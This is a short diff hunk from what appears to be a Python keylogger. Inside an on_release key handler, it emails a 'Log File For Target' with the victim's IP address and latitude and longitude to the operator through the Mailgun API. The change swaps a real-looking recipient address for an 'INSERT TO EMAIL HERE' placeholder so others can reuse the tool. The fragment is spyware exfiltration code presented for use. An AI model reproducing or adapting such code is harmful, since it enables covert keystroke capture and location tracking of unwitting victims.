@@ -75,7 +75,7 @@ def on_release(key):
             auth=("api", f"{mail_apikey}"),
             data={
                 "from": "Mailgun Sandbox <postmaster@sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org>",
-                "to": "Host <l0wk3yiaan@protonmail.com>",
+                "to": "Host <INSERT TO EMAIL HERE>",
                 "subject": "Log File For Target: " + ipinfo["ip"],
                 "text": "Log file for target:\n\nIP:" + ipinfo["ip"] + "\nLatitude:" + str(ipinfo["location"]["lat"]) + "\nLongitude:" + str(ipinfo["location"]["lng"]) 
                 },
